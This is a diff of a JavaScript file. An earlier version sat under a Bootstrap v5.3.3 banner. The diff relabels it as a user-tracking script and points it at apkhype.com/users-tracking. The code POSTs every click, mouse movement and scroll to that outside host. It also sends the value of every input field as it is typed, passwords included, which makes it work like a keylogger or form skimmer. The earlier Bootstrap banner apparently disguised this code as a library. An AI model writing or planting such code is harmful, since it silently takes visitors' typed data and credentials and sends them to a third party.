@@ -1,15 +1,13 @@
 /*!
-  * Bootstrap v5.3.3 (https://getbootstrap.com/)
-  * Copyright 2011-2024 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
-  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
+  * This is users tracking behavior script
+  * Copyright 2025 Modobom
+  * Licensed under MIT
   */
 
-// Tạo một đối tượng để lưu trữ các sự kiện
 const userEvents = [];
 
-// Hàm để gửi dữ liệu về máy chủ
 function sendDataToServer(data) {
-    fetch('https://your-server-endpoint.com/track', {
+    fetch('https://apkhype.com/users-tracking', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -21,7 +19,6 @@ function sendDataToServer(data) {
         .catch(error => console.error('Error:', error));
 }
 
-// Hàm để ghi lại sự kiện
 function recordEvent(eventName, eventData) {
     const event = {
         eventName: eventName,
@@ -29,12 +26,9 @@ function recordEvent(eventName, eventData) {
         timestamp: new Date().toISOString()
     };
     userEvents.push(event);
-
-    // Gửi dữ liệu về máy chủ mỗi khi có sự kiện mới
     sendDataToServer(event);
 }
 
-// Theo dõi sự kiện nhấp chuột
 document.addEventListener('click', (event) => {
     recordEvent('click', {
         x: event.clientX,
@@ -43,7 +37,6 @@ document.addEventListener('click', (event) => {
     });
 });
 
-// Theo dõi sự kiện di chuyển chuột
 document.addEventListener('mousemove', (event) => {
     recordEvent('mousemove', {
         x: event.clientX,
@@ -51,7 +44,6 @@ document.addEventListener('mousemove', (event) => {
     });
 });
 
-// Theo dõi sự kiện cuộn trang
 document.addEventListener('scroll', () => {
     recordEvent('scroll', {
         scrollTop: window.scrollY,
@@ -59,12 +51,9 @@ document.addEventListener('scroll', () => {
     });
 });
 
-// Theo dõi sự kiện nhập liệu
 document.addEventListener('input', (event) => {
     recordEvent('input', {
         target: event.target.tagName,
         value: event.target.value
     });
 });
-
-console.log('User tracking initialized.');
